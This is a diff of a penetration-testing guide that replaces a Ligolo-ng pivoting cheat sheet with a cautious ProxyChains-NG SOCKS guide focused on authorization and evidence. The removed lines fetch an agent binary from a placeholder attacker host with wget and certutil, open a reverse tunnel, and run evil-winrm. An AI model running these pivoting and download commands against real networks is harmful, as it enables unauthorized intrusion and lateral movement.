@@ -1,200 +1,81 @@
-# Pivoting – Ligolo-ng
+# Pivoting with ProxyChains-NG
 
-## Purpose
+Purpose: send supported TCP application connections through an existing SOCKS proxy. ProxyChains does not create the proxy or a routed interface.
 
-This file provides a structured workflow for using Ligolo-ng to pivot into internal networks using a TUN interface.
+Status: reference-reviewed 2026-09-25 against the upstream README/configuration; isolated network lab execution pending. Record installed versions and the exact application tested.
 
-Core rules:
-- Ligolo provides full network access (not just port forwarding)
-- Uses a virtual network interface (TUN)
-- Allows native tool usage (nmap, smbclient, etc.)
-- More powerful than SOCKS-based pivoting
+## Prerequisites and limits
 
----
+Identify an authorized pivot, destination, and destination port. Confirm the pivot can reach the service and that the operator is allowed to use that path.
 
-## 0. Mental Model
+ProxyChains intercepts networking calls in compatible dynamically linked applications. It supports TCP, not arbitrary UDP or ICMP. Static binaries and programs with incompatible networking behavior may bypass interception or fail. It is not a universal traffic isolation boundary. Consult the [upstream README](https://github.com/rofl0r/proxychains-ng).
 
-You create a virtual network interface on your attacker machine.
+Prefer an application's native SOCKS support when available. Validate actual traffic paths rather than relying solely on a ProxyChains startup message.
 
-Traffic flows like:
+## 1. Start a loopback-bound SOCKS listener
 
-[ATTACKER] ⇄ [TUN INTERFACE] ⇄ [AGENT] ⇄ [INTERNAL NETWORK]
+Run on the operator host, replacing the account and pivot hostname:
 
-To your tools:
-→ internal network looks directly connected
+```bash
+ssh -N -o ExitOnForwardFailure=yes -D 127.0.0.1:1080 USER@PIVOT_HOST
+```
 
----
+Keep this foreground session running. Verify the SSH host key using the engagement's trusted record. This example uses [OpenSSH dynamic forwarding](https://man.openbsd.org/ssh); Chisel or another approved proxy can serve the same role.
 
-## 1. Components
+## 2. Use an engagement-local configuration
 
-- ligolo-proxy (attacker)
-- ligolo-agent (target)
+Create `proxychains.conf` in the engagement workspace:
 
----
+```text
+strict_chain
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
 
-## 2. Start Proxy (ATTACKER)
+[ProxyList]
+socks5 127.0.0.1 1080
+```
 
-./proxy -selfcert
+Use one chain mode and the explicit `-f` option, avoiding accidental use of a system configuration. `proxy_dns` affects supported resolver calls; confirm its behavior with the actual application and resolver environment. See the [upstream configuration comments](https://github.com/rofl0r/proxychains-ng/blob/master/src/proxychains.conf).
 
-OR specify port:
+## 3. Verify one approved service
 
-./proxy -selfcert -laddr 0.0.0.0:11601
+For an HTTPS application, replace `INTERNAL_HOST` with its real hostname and preserve normal certificate validation:
 
----
+```bash
+proxychains4 -f ./proxychains.conf curl --connect-timeout 5 --max-time 15 -I https://INTERNAL_HOST/
+```
 
-## 3. Transfer Agent
+Record the response, time, destination identity, and proxy diagnostics. An HTTP error response can still establish connectivity; it does not establish authorization bypass. A TLS error may indicate a hostname or trust-store issue rather than failed routing.
 
-python3 -m http.server 8000
+For an approved numeric target and a bounded port check, a compatible Nmap installation can use:
 
-On target:
+```bash
+proxychains4 -f ./proxychains.conf nmap -sT -Pn -n -p 443 --max-retries 1 TARGET_IP
+```
 
-wget http://<ATTACKER_IP>:8000/agent.exe
+Replace `TARGET_IP` before use. `-sT` selects TCP connect, `-Pn` omits host discovery, and `-n` omits name lookup. Do not substitute SYN/UDP scans or add broad discovery options. Verify this combination in the lab using endpoint logs or packet capture; Nmap compatibility is not guaranteed merely by these flags. See [Nmap scan techniques](https://nmap.org/book/man-port-scanning-techniques.html).
 
-OR:
+## 4. Diagnose failures
 
-certutil -urlcache -split -f http://<ATTACKER_IP>:8000/agent.exe agent.exe
+| Result | Next check |
+| --- | --- |
+| Connection to proxy refused | SSH session and loopback listener/port |
+| Proxy works but target times out | Pivot reachability, target service and firewall |
+| Numeric IP works but name fails | Resolver path and application compatibility |
+| Application works even with proxy stopped | Direct route, cached result, or interception bypass |
+| Ping/UDP fails | Unsupported transport; use a suitable approved method |
 
----
+In an isolated lab without a direct route, stop the proxy and repeat an uncached request. The request should fail. Verify the positive path in target logs as well; failure alone does not prove every prior connection used the proxy.
 
-## 4. Start Agent (TARGET)
+## 5. Evidence, cleanup, and remediation
 
-./agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
+Record sanitized commands/configuration, tool versions, operator/pivot/destination diagram, request/result, source observed by the destination, DNS behavior, and negative-control results. Store secrets outside shared command examples.
 
----
+Stop the specific SSH session and confirm its listener is closed. Remove any temporary test configuration after preserving needed evidence. Do not remove unrelated routes or terminate other operators' sessions.
 
-## 5. Create TUN Interface (ATTACKER)
+If the path demonstrates a segmentation issue, report the unintended source-to-destination access and expected policy. Recommend appropriate service authorization and network restrictions, then retest from the same source after remediation. Merely running ProxyChains is not a finding.
 
-sudo ip tuntap add user $(whoami) mode tun ligolo
+## Validation still required
 
-sudo ip link set ligolo up
-
----
-
-## 6. Start Session (PROXY CONSOLE)
-
-Inside proxy:
-
-session
-
-Select agent
-
----
-
-## 7. Start Tunnel
-
-start
-
----
-
-## 8. Add Route to Internal Network (CRITICAL)
-
-Example:
-
-sudo ip route add 10.10.0.0/24 dev ligolo
-
----
-
-## 9. Verify Connectivity
-
-ping 10.10.0.1
-
----
-
-## 10. Use Native Tools (BIG ADVANTAGE)
-
-nmap -sT -Pn 10.10.0.5
-
-smbclient -L //10.10.0.5
-
-evil-winrm -i 10.10.0.5 -u user -p password
-
----
-
-## 11. Multiple Networks
-
-Add additional routes:
-
-sudo ip route add 172.16.0.0/16 dev ligolo
-
----
-
-## 12. Remove Route (Cleanup)
-
-sudo ip route del 10.10.0.0/24
-
----
-
-## 13. Background Sessions
-
-You can maintain multiple agents and switch between them
-
----
-
-## 14. Common Use Cases
-
-- Active Directory enumeration
-- internal SMB scanning
-- RDP access
-- web application testing
-- lateral movement
-
----
-
-## 15. Common Failure Points (CRITICAL)
-
-- forgetting to add route
-- wrong subnet
-- TUN interface not up
-- firewall blocking connection
-- using ICMP when blocked
-
----
-
-## 16. If Ping Fails
-
-Try:
-
-nmap -Pn <target>
-
-ICMP often blocked
-
----
-
-## 17. Troubleshooting Checklist
-
-- agent connected?
-- TUN interface up?
-- route added?
-- correct subnet?
-- correct internal IP?
-
----
-
-## 18. Quick Exploit Pattern
-
-1. start proxy
-2. upload agent
-3. connect agent
-4. create TUN interface
-5. start tunnel
-6. add route
-7. scan internal network
-
----
-
-## 19. Mental Model
-
-Agent = foothold  
-TUN = bridge  
-Route = direction  
-Tools = direct access  
-
----
-
-## 20. Golden Rules
-
-- Always add route (most common failure)
-- Use correct subnet (not /32 unless needed)
-- Prefer TCP scans (nmap -sT -Pn)
-- Ligolo = near-native access (use it fully)
-- Keep chisel as fallback
+Use an isolated operator/pivot/destination topology to record successful TCP forwarding, hostname behavior, a refused port, a stopped proxy, and cleanup. Record a known incompatible application case if encountered. This page is not yet lab-validated.
